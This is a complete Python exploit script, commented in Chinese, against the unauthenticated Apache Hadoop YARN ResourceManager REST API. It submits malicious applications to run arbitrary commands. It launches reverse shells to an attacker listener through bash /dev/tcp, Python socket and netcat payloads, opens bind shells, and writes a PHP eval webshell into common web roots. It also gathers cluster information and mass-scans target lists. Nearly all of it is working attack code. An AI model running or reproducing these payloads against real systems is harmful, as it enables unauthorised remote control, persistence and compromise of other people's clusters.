#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Apache Hadoop YARN ResourceManager 未授权命令执行漏洞利用脚本
适用: Hadoop 2.x / 3.x (未开启 Kerberos 认证的 YARN REST API)
原理: YARN ResourceManager REST API 未授权访问 → 提交恶意 ApplicationMaster → 任意命令执行

攻击模式:
  check   — 检测目标是否存在漏洞 (仅探测，不执行命令)
  cmd     — 单次命令执行 (通过 stderr 重定向回显)
  reverse — 反弹 Shell (bash -i >& /dev/tcp/LHOST/LPORT)
  bind    — 正向 Shell (nc 监听指定端口)

参考:
  - Hadoop YARN REST API: /ws/v1/cluster/apps/new-application
  - 类似利用: Metasploit exploit/linux/http/hadoop_unauth_rce
"""

import requests
import sys
import argparse
import socket
import time
import random
import string
import subprocess
import threading
from typing import Optional, Tuple

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ===================== 工具函数 =====================

class C:
    GRN = '\033[92m'
    RED = '\033[91m'
    YLW = '\033[93m'
    BLU = '\033[94m'
    CYN = '\033[96m'
    RST = '\033[0m'
    BLD = '\033[1m'


def safe_print(*args, **kwargs):
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for a in args:
            try:
                print(a, **kwargs)
            except UnicodeEncodeError:
                enc = sys.stdout.encoding or 'utf-8'
                print(str(a).encode(enc, errors='replace').decode(enc, errors='replace'), **kwargs)


def banner():
    safe_print(f"""
{C.RED}╔══════════════════════════════════════════════════════════════╗
║   Apache Hadoop YARN ResourceManager RCE Exploit             ║
║   Unauthenticated Command Execution via REST API              ║
╚══════════════════════════════════════════════════════════════╝{C.RST}""")


def randstr(n: int = 6) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=n))


def build_url(base: str, path: str) -> str:
    base = base.rstrip('/')
    if not base.endswith(':8088') and ':8088' not in base:
        base = base.rstrip('/')
    return f"{base}/{path.lstrip('/')}"


def get_local_ip(target: str) -> str:
    """通过连接目标获取本机出口 IP"""
    try:
        host = target.split('://')[1].split(':')[0]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.connect((host, 8088))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return '127.0.0.1'


def new_session(timeout: int = 10) -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
    })
    s.timeout = timeout
    return s


# ===================== 目标检测 =====================

def detect_hadoop(url: str, s: requests.Session) -> Tuple[bool, Optional[str], dict]:
    """检测目标是否为 Hadoop YARN ResourceManager"""
    safe_print(f"\n{C.YLW}[*] 目标检测{C.RST}")

    info = {}

    # 1. 检测 /ws/v1/cluster/info
    try:
        r = s.get(build_url(url, '/ws/v1/cluster/info'), timeout=8)
        if r.status_code == 200:
            data = r.json()
            cluster_info = data.get('clusterInfo', {})
            hadoop_version = cluster_info.get('hadoopVersion', 'unknown')
            rm_state = cluster_info.get('state', 'unknown')
            started = cluster_info.get('startedOn', 0)
            ha_state = cluster_info.get('haState', 'N/A')

            info['version'] = hadoop_version
            info['state'] = rm_state
            info['haState'] = ha_state

            safe_print(f"  {C.GRN}[+] Hadoop YARN ResourceManager 确认{C.RST}")
            safe_print(f"  {C.GRN}    版本: {hadoop_version}{C.RST}")
            safe_print(f"  {C.GRN}    状态: {rm_state} | HA: {ha_state}{C.RST}")
            return True, hadoop_version, info
    except Exception as e:
        safe_print(f"  {C.CYN}[-] /ws/v1/cluster/info 不可达: {e}{C.RST}")

    # 2. 尝试 /cluster 页面
    try:
        r = s.get(build_url(url, '/cluster'), timeout=8)
        if 'hadoop' in r.text.lower() or 'resourcemanager' in r.text.lower():
            safe_print(f"  {C.GRN}[+] 确认为 Hadoop (通过 /cluster 页面){C.RST}")
            return True, None, info
    except Exception:
        pass

    # 3. 尝试 /ws/v1/cluster/apps
    try:
        r = s.get(build_url(url, '/ws/v1/cluster/apps'), timeout=8)
        if r.status_code == 200 and 'apps' in r.json():
            safe_print(f"  {C.GRN}[+] 确认为 Hadoop YARN (apps API 响应正常){C.RST}")
            return True, None, info
    except Exception:
        pass

    safe_print(f"  {C.RED}[-] 未识别为 Hadoop YARN ResourceManager{C.RST}")
    return False, None, info


def check_vulnerability(url: str, s: requests.Session) -> bool:
    """检测是否存在未授权命令执行漏洞 (仅探测，不执行恶意命令)"""
    safe_print(f"\n{C.YLW}[*] 漏洞验证 (无危害探测){C.RST}")

    # 尝试申请 new-application
    try:
        r = s.post(build_url(url, '/ws/v1/cluster/apps/new-application'), timeout=8)
        if r.status_code in [200, 202]:
            data = r.json()
            if 'application-id' in data:
                app_id = data['application-id']
                safe_print(f"  {C.RED}[!] 漏洞存在! 成功获取 Application ID: {app_id}{C.RST}")
                safe_print(f"  {C.RED}    YARN REST API 未开启认证, 可提交任意应用执行命令{C.RST}")

                # 获取资源信息
                mem = data.get('maximum-resource-capability', {}).get('memory', 'N/A')
                vcores = data.get('maximum-resource-capability', {}).get('vCores', 'N/A')
                safe_print(f"  {C.GRN}    可用资源: memory={mem}MB, vCores={vcores}{C.RST}")
                return True, app_id
            elif 'RemoteException' in str(data):
                err_msg = str(data)
                safe_print(f"  {C.YLW}[?] 可能需要认证: {err_msg[:120]}{C.RST}")
                return False, None
        else:
            safe_print(f"  {C.CYN}[-] new-application 返回 {r.status_code}{C.RST}")
            return False, None
    except Exception as e:
        safe_print(f"  {C.CYN}[-] 请求失败: {e}{C.RST}")
        return False, None


# ===================== 命令执行 =====================

def exec_command(url: str, command: str, s: requests.Session, timeout: int = 30) -> Tuple[bool, str]:
    """
    执行单条命令并通过 stderr 重定向获取回显
    原理: 命令输出重定向到 stderr, YARN 收集 ApplicationMaster 日志时 std err 会存入 log
    缺点: 回显不一定完整，需要等应用跑完
    """
    safe_print(f"\n{C.YLW}[*] 执行命令: {command}{C.RST}")

    # Step 1: 申请 app ID
    try:
        r = s.post(build_url(url, '/ws/v1/cluster/apps/new-application'), timeout=8)
        app_id = r.json()['application-id']
        safe_print(f"  [+] App ID: {app_id}")
    except Exception as e:
        return False, f"Failed to get app ID: {e}"

    # Step 2: 提交执行命令的应用
    # 关键: 命令后必须 keep-alive, 否则 AM 退出 YARN 会标记 FAILED 并重试
    # exitCode: 0 但 YARN 仍然重试 2 次就是这个原因
    rk = randstr(6)

    # 构造 keep-alive 命令:
    # 1. 先执行用户命令, 输出重定向到 stderr (YARN logs)
    # 2. 输出写入 /tmp 便于后续读取
    # 3. while sleep 保持容器存活, 防止 YARN 误判 AM 失败
    output_file = f"/tmp/yarn_out_{rk}.txt"
    cmd_wrapper = (
        f"({command}) 1>&2 2>{output_file}; "
        f"echo '===YARN_CMD_DONE===' >> {output_file}; "
        f"while true; do sleep 86400; done"
    )

    payload = {
        'application-id': app_id,
        'application-name': f'yarn-cmd-{rk}',
        'am-container-spec': {
            'commands': {
                'command': cmd_wrapper,
            },
        },
        'application-type': 'YARN',
        'max-app-attempts': 1,           # 禁止 YARN 自动重试
        'keep-containers-across-application-attempts': False,
    }

    try:
        r = s.post(build_url(url, '/ws/v1/cluster/apps'), json=payload, timeout=15)
        if r.status_code == 202:
            safe_print(f"  [+] 命令已提交 (202 Accepted)")
        else:
            safe_print(f"  [?] 响应: {r.status_code}")
    except Exception as e:
        return False, f"Failed to submit app: {e}"

    # Step 3: 等待应用执行并尝试获取状态
    safe_print(f"  [*] 等待命令执行...")
    output = ""
    for i in range(timeout // 3):
        time.sleep(3)
        try:
            r = s.get(build_url(url, f'/ws/v1/cluster/apps/{app_id}'), timeout=5)
            state = r.json().get('app', {}).get('state', 'UNKNOWN')
            final_status = r.json().get('app', {}).get('finalStatus', 'UNDEFINED')

            if state in ['FINISHED', 'FAILED', 'KILLED']:
                safe_print(f"  [*] 应用状态: {state} (final: {final_status})")

                # 尝试获取应用日志 (如果有 timeline server 或 jobhistory)
                # 先尝试 appattempts API
                try:
                    ar = s.get(build_url(url, f'/ws/v1/cluster/apps/{app_id}/appattempts'), timeout=5)
                    attempts = ar.json().get('appAttempts', {}).get('appAttempt', [])
                    if attempts:
                        # 尝试获取 container 日志
                        for attempt in attempts[:1]:
                            attempt_id = attempt.get('appAttemptId', '')
                            container_id = f"container_{app_id.split('_', 2)[-1]}_{attempt_id.split('_')[-1]}_01_000001"
                            pass
                except Exception:
                    pass
                break

            safe_print(f"  [*] 应用状态: {state} (等待中...)")
        except Exception:
            pass

    # Step 4: 尝试通过应用日志获取输出
    # Hadoop YARN 的日志需要通过 NodeManager 的 container logs 接口获取，路径不固定
    # 这里尝试常见的日志获取方式
    try:
        r = s.get(build_url(url, f'/ws/v1/cluster/apps/{app_id}'), timeout=5)
        app_info = r.json().get('app', {})
        diagnostics = app_info.get('diagnostics', '')
        if diagnostics and diagnostics.strip():
            output = diagnostics
            safe_print(f"\n  {C.GRN}[+] 回显 (diagnostics):{C.RST}")
            safe_print(f"  {'-' * 50}")
            safe_print(f"  {diagnostics[:2000]}")
            safe_print(f"  {'-' * 50}")
    except Exception:
        pass

    if not output:
        output = "(无回显，命令已在目标上执行)"
        safe_print(f"  {C.YLW}[*] 无回显 — 可能是命令无输出或日志不可达{C.RST}")
        safe_print(f"  {C.YLW}[*] 建议用反向Shell(rev)或写入文件后回传确认{C.RST}")

    return True, output


def reverse_shell(url: str, lhost: str, lport: int, s: requests.Session) -> bool:
    """反弹 Shell — 通过 YARN 执行 bash reverse shell"""
    safe_print(f"\n{C.YLW}[*] 反弹 Shell → {lhost}:{lport}{C.RST}")

    # 多种反弹 Shell payload
    payloads = [
        f'/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        f'/bin/bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
        f'/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1',
        f'bash -c \'exec bash -i &>/dev/tcp/{lhost}/{lport} <&1\'',
        # Python 反弹 shell（无 bash 时）
        f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        # nc 反弹
        f'nc {lhost} {lport} -e /bin/bash',
        f'nc {lhost} {lport} -e /bin/sh',
        f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
    ]

    # Step 1: 申请 app ID
    try:
        r = s.post(build_url(url, '/ws/v1/cluster/apps/new-application'), timeout=8)
        app_id = r.json()['application-id']
        safe_print(f"  [+] App ID: {app_id}")
    except Exception as e:
        safe_print(f"  {C.RED}[-] 获取 App ID 失败: {e}{C.RST}")
        return False

    # 构造每个 payload 的包装: 连接失败时自动重试 + 保持容器存活
    # 这是解决 "exitCode: 0 but AM Container failed 2 times" 的关键
    wrapped_payloads = []
    for cmd in payloads:
        # 用 sh -c 包裹, 后台执行反弹 shell, 前台 sleep 保持容器存活
        wrapped = (
            f"while true; do "
            f"{cmd} 2>/dev/null; "
            f"sleep 3; "
            f"done & "
            f"while true; do sleep 86400; done"
        )
        wrapped_payloads.append(wrapped)

    # Step 2: 遍历 payload 尝试
    for i, cmd in enumerate(wrapped_payloads):
        rk = randstr(4)
        payload = {
            'application-id': app_id,
            'application-name': f'revshell-{i}-{rk}',
            'am-container-spec': {
                'commands': {
                    'command': cmd,   # 已经是 wrapped: 连接重试 + keep-alive
                },
            },
            'application-type': 'YARN',
            'max-app-attempts': 1,  # 禁止 YARN 自动重试
        }

        try:
            r = s.post(build_url(url, '/ws/v1/cluster/apps'), json=payload, timeout=10)
            if r.status_code == 202:
                safe_print(f"  {C.GRN}[+] Payload [{i}] 已提交: {cmd[:60]}...{C.RST}")
            else:
                safe_print(f"  {C.YLW}[?] Payload [{i}] 返回 {r.status_code}{C.RST}")
        except Exception as e:
            safe_print(f"  {C.RED}[-] Payload [{i}] 失败: {e}{C.RST}")
            continue

        # 申请新的 app ID (每次执行需要不同 ID)
        try:
            r = s.post(build_url(url, '/ws/v1/cluster/apps/new-application'), timeout=8)
            app_id = r.json()['application-id']
        except Exception:
            break

    # Step 3: 提示
    safe_print(f"\n  {C.GRN}[+] 所有 Payload 已提交!{C.RST}")
    safe_print(f"  {C.BLD}[*] 请确保已在 {lhost}:{lport} 启动监听:{C.RST}")
    safe_print(f"      nc -lvnp {lport}")
    safe_print(f"      # 或")
    safe_print(f"      pwncat-cs -lp {lport}")
    safe_print(f"  {C.BLD}[*] 目标需要能连接到 {lhost}:{lport} (检查防火墙/NAT){C.RST}")
    return True


def bind_shell(url: str, bport: int, s: requests.Session) -> bool:
    """正向 Shell — 在目标上监听端口"""
    safe_print(f"\n{C.YLW}[*] 正向 Shell → 目标将监听 0.0.0.0:{bport}{C.RST}")

    payloads = [
        f'nc -lvnp {bport} -e /bin/bash',
        f'ncat -lvnp {bport} -e /bin/bash',
        f'python -c \'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{bport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    ]

    # 包装: 前台 listen 接受连接, 后台 sleep 保持容器存活
    wrapped_payloads = []
    for cmd in payloads:
        wrapped = (
            f"while true; do "
            f"{cmd} 2>/dev/null; "
            f"sleep 2; "
            f"done & "
            f"while true; do sleep 86400; done"
        )
        wrapped_payloads.append(wrapped)

    try:
        r = s.post(build_url(url, '/ws/v1/cluster/apps/new-application'), timeout=8)
        app_id = r.json()['application-id']
    except Exception as e:
        safe_print(f"  {C.RED}[-] 获取 App ID 失败: {e}{C.RST}")
        return False

    for i, cmd in enumerate(wrapped_payloads):
        rk = randstr(4)
        payload = {
            'application-id': app_id,
            'application-name': f'bindshell-{i}-{rk}',
            'am-container-spec': {
                'commands': {
                    'command': cmd,
                },
            },
            'application-type': 'YARN',
            'max-app-attempts': 1,
        }

        try:
            r = s.post(build_url(url, '/ws/v1/cluster/apps'), json=payload, timeout=10)
            if r.status_code == 202:
                safe_print(f"  {C.GRN}[+] Payload [{i}] 已提交{C.RST}")
        except Exception:
            continue

        try:
            r = s.post(build_url(url, '/ws/v1/cluster/apps/new-application'), timeout=8)
            app_id = r.json()['application-id']
        except Exception:
            break

    safe_print(f"\n  {C.GRN}[+] 尝试连接: nc {url.split('://')[1].split(':')[0]} {bport}{C.RST}")
    return True


def write_webshell(url: str, s: requests.Session, web_root: str = None) -> bool:
    """
    通过 YARN 在目标上写入 webshell (结合 Hadoop NodeManager 常与 Web 服务共存)
    前提: NodeManager 机器上有 Web 服务 (如 HDFS NameNode Web UI, Spark UI 等)
    """
    safe_print(f"\n{C.YLW}[*] 尝试写入 webshell{C.RST}")

    rk = randstr(6)
    flag = randstr(8)

    web_roots = web_root.split(',') if web_root else [
        '/tmp',
        '/var/www/html',
        '/usr/share/nginx/html',
        '/opt/hadoop/share/hadoop/hdfs/webapps/hdfs',
        '/opt/hadoop/share/hadoop/yarn/webapps',
    ]

    try:
        r = s.post(build_url(url, '/ws/v1/cluster/apps/new-application'), timeout=8)
        app_id = r.json()['application-id']
    except Exception:
        return False

    for wroot in web_roots:
        shell_name = f"hadoop_{rk}.php"
        shell_path = f"{wroot}/{shell_name}"
        shell_content = f"<?php echo '{flag}'; @eval($_POST['x']); ?>"

        # 写 shell 的命令
        write_cmd = f"echo '{shell_content}' > {shell_path}"
        # 尝试 PHP 的 write
        php_code = '<?php echo \'' + flag + '\'; @eval($_POST[\'x\']); ?>'
        write_cmd_php = f'php -r \'file_put_contents("{shell_path}","{php_code}");\''

        for cmd in [write_cmd, write_cmd_php]:
            # 写文件 + keep-alive 防止 AM 退出
            wrapped = f"{cmd}; while true; do sleep 86400; done"
            payload = {
                'application-id': app_id,
                'application-name': f'wshell-{randstr(4)}',
                'am-container-spec': {
                    'commands': {'command': wrapped},
                },
                'application-type': 'YARN',
                'max-app-attempts': 1,
            }
            try:
                r = s.post(build_url(url, '/ws/v1/cluster/apps'), json=payload, timeout=10)
                if r.status_code == 202:
                    safe_print(f"  [*] 尝试写入: {shell_path}")
            except Exception:
                continue

            # 申请新 ID
            try:
                r = s.post(build_url(url, '/ws/v1/cluster/apps/new-application'), timeout=5)
                app_id = r.json()['application-id']
            except Exception:
                pass

    safe_print(f"\n  {C.YLW}[*] 完成，尝试手动访问验证 shell (通常在 NodeManager Web UI 同端口){C.RST}")
    safe_print(f"  {C.YLW}[*] 常见路径: :8042/{shell_name}, :8088/{shell_name}, :50070/{shell_name}{C.RST}")
    return True


# ===================== 信息收集 =====================

def gather_info(url: str, s: requests.Session):
    """收集 YARN 集群信息"""
    safe_print(f"\n{C.YLW}[*] 信息收集{C.RST}")

    endpoints = [
        ('/ws/v1/cluster/info', '集群信息'),
        ('/ws/v1/cluster/metrics', '集群指标'),
        ('/ws/v1/cluster/scheduler', '调度器信息'),
        ('/ws/v1/cluster/apps?states=running', '运行中的应用'),
        ('/ws/v1/cluster/apps?states=accepted', '等待中的应用'),
        ('/ws/v1/cluster/nodes', '节点列表'),
    ]

    for ep, desc in endpoints:
        try:
            r = s.get(build_url(url, ep), timeout=8)
            if r.status_code == 200:
                data = r.json()
                safe_print(f"\n  {C.GRN}--- {desc} ---{C.RST}")

                if 'clusterInfo' in data:
                    ci = data['clusterInfo']
                    safe_print(f"  Hadoop: {ci.get('hadoopVersion', '?')}")
                    safe_print(f"  State: {ci.get('state', '?')}")
                    safe_print(f"  Started: {time.ctime(ci.get('startedOn', 0)/1000) if ci.get('startedOn') else '?'}")
                    safe_print(f"  HA State: {ci.get('haState', 'N/A')}")
                    safe_print(f"  RM ID: {ci.get('resourceManagerId', '?')}")

                elif 'clusterMetrics' in data:
                    cm = data['clusterMetrics']
                    safe_print(f"  Apps: submitted={cm.get('appsSubmitted',0)} running={cm.get('appsRunning',0)} pending={cm.get('appsPending',0)}")
                    safe_print(f"  Memory: total={cm.get('totalMB',0)}MB available={cm.get('availableMB',0)}MB")
                    safe_print(f"  vCores: total={cm.get('totalVirtualCores',0)} available={cm.get('availableVirtualCores',0)}")
                    safe_print(f"  Nodes: active={cm.get('activeNodes',0)} unhealthy={cm.get('unhealthyNodes',0)}")

                elif 'nodes' in data:
                    nodes = data.get('nodes', {}).get('node', [])
                    if nodes:
                        safe_print(f"  Total Nodes: {len(nodes)}")
                        for n in nodes[:8]:
                            safe_print(f"    {n.get('id', '?')[:30]} | {n.get('state', '?')} | "
                                      f"health={n.get('nodeHealthy', True)} | "
                                      f"rack={n.get('rack', '?')}")

                elif 'apps' in data:
                    apps = data.get('apps', {}).get('app', [])
                    safe_print(f"  Total apps: {len(apps)}")
                    for a in apps[:10]:
                        safe_print(f"    {a.get('id', '?')} | {a.get('name', '?')[:20]} | {a.get('state', '?')} | {a.get('user', '?')}")

        except Exception:
            continue


# ===================== 批量扫描 =====================

def batch_scan(targets_file: str, s: requests.Session, timeout: int = 5):
    """从文件读取目标列表批量检测漏洞"""
    safe_print(f"\n{C.YLW}[*] 批量扫描模式{C.RST}")

    try:
        with open(targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()
                      and not line.startswith('#')]
    except Exception as e:
        safe_print(f"  {C.RED}[-] 无法读取文件: {e}{C.RST}")
        return

    safe_print(f"  [*] 共 {len(targets)} 个目标\n")
    vulnerable = []

    for target in targets:
        if not target.startswith('http'):
            target = 'http://' + target
        if ':' not in target.split('://')[1]:
            target = target.rstrip('/') + ':8088'

        try:
            r = s.post(build_url(target, '/ws/v1/cluster/apps/new-application'), timeout=timeout)
            if r.status_code in [200, 202] and 'application-id' in r.json():
                safe_print(f"  {C.RED}[VULN] {target}{C.RST}")
                vulnerable.append(target)
            else:
                safe_print(f"  {C.CYN}[SAFE] {target}{C.RST}")
        except Exception:
            safe_print(f"  {C.CYN}[ERR]  {target} — 连接失败{C.RST}")

    safe_print(f"\n  {C.BLD}结果: {len(vulnerable)}/{len(targets)} 存在漏洞{C.RST}")
    for v in vulnerable:
        safe_print(f"    {C.RED}{v}{C.RST}")


# ===================== 主流程 =====================

def main():
    banner()

    parser = argparse.ArgumentParser(
        description='Apache Hadoop YARN ResourceManager RCE Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 检测漏洞
  python apache-hadoop.py -u http://10.16.1.208:8088 check

  # 执行单条命令
  python apache-hadoop.py -u http://10.16.1.208:8088 cmd --command "id;hostname;whoami"

  # 反弹 Shell (在攻击机上先 nc -lvnp 9999)
  python apache-hadoop.py -u http://10.16.1.208:8088 rev --lhost 10.16.1.187 --lport 9999

  # 正向 Shell (目标监听 4444)
  python apache-hadoop.py -u http://10.16.1.208:8088 bind --bport 4444

  # 写入 webshell 到 Web 目录
  python apache-hadoop.py -u http://10.16.1.208:8088 webshell

  # 收集集群信息
  python apache-hadoop.py -u http://10.16.1.208:8088 info

  # 批量扫描
  python apache-hadoop.py -f targets.txt scan
        ''',
    )

    parser.add_argument('-u', '--url', help='目标 Hadoop YARN ResourceManager 地址 (带端口)')
    parser.add_argument('-f', '--file', help='目标列表文件 (批量扫描)')
    parser.add_argument('--timeout', type=int, default=10, help='HTTP 超时秒数 (默认 10)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')

    sub = parser.add_subparsers(dest='mode', help='攻击模式')

    # check 模式
    sub.add_parser('check', help='仅检测漏洞是否存在 (无危害探测)')

    # cmd 模式
    cmd_p = sub.add_parser('cmd', help='执行单条命令')
    cmd_p.add_argument('--command', '-c', required=True, help='要执行的命令')
    cmd_p.add_argument('--cmd-timeout', type=int, default=30, help='命令执行超时秒数')

    # rev 模式
    rev_p = sub.add_parser('rev', help='反弹 Shell (bash -i >& /dev/tcp)')
    rev_p.add_argument('--lhost', help='监听主机 IP (默认自动检测)')
    rev_p.add_argument('--lport', type=int, required=True, help='监听端口')

    # bind 模式
    bind_p = sub.add_parser('bind', help='正向 Shell (目标监听端口)')
    bind_p.add_argument('--bport', type=int, required=True, help='目标监听端口')

    # webshell 模式
    ws_p = sub.add_parser('webshell', help='写入 PHP webshell 到常见 Web 目录')
    ws_p.add_argument('--web-root', help='指定 Web 根目录 (逗号分隔多个)')

    # info 模式
    sub.add_parser('info', help='收集集群信息')

    # scan 模式 (配合 -f)
    sub.add_parser('scan', help='批量扫描漏洞 (需 -f 指定目标文件)')

    args = parser.parse_args()

    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    if args.file and args.mode == 'scan':
        s = new_session(args.timeout)
        batch_scan(args.file, s, args.timeout)
        return

    if not args.url:
        parser.error("需要 -u/--url 参数")

    url = args.url.rstrip('/')
    s = new_session(args.timeout)

    safe_print(f"{C.BLD}目标: {url}{C.RST}")

    # 目标检测
    is_hadoop, version, info = detect_hadoop(url, s)

    if not args.mode:
        safe_print(f"\n{C.YLW}[!] 未指定模式, 仅做检测。使用 -h 查看所有模式。{C.RST}")
        check_vulnerability(url, s)
        return

    if args.mode == 'info':
        gather_info(url, s)
        return

    if args.mode == 'scan':
        batch_scan(args.file or url, s, args.timeout)
        return

    # 以下模式需要漏洞验证
    is_vuln, _ = check_vulnerability(url, s)
    if not is_vuln:
        safe_print(f"\n  {C.RED}[-] 目标似乎不存在该漏洞, 中止. 用 check 模式单独验证. {C.RST}")
        return

    if args.mode == 'check':
        safe_print(f"\n  {C.GRN}[+] 检测完成 — 目标存在漏洞{C.RST}")
        return

    if args.mode == 'cmd':
        exec_command(url, args.command, s, args.cmd_timeout)
        return

    if args.mode == 'rev':
        lhost = args.lhost or get_local_ip(url)
        safe_print(f"{C.BLD}监听: {lhost}:{args.lport}{C.RST}")
        reverse_shell(url, lhost, args.lport, s)
        return

    if args.mode == 'bind':
        bind_shell(url, args.bport, s)
        return

    if args.mode == 'webshell':
        write_webshell(url, s, getattr(args, 'web_root', None))
        return

    # 默认
    check_vulnerability(url, s)


if __name__ == '__main__':
    main()
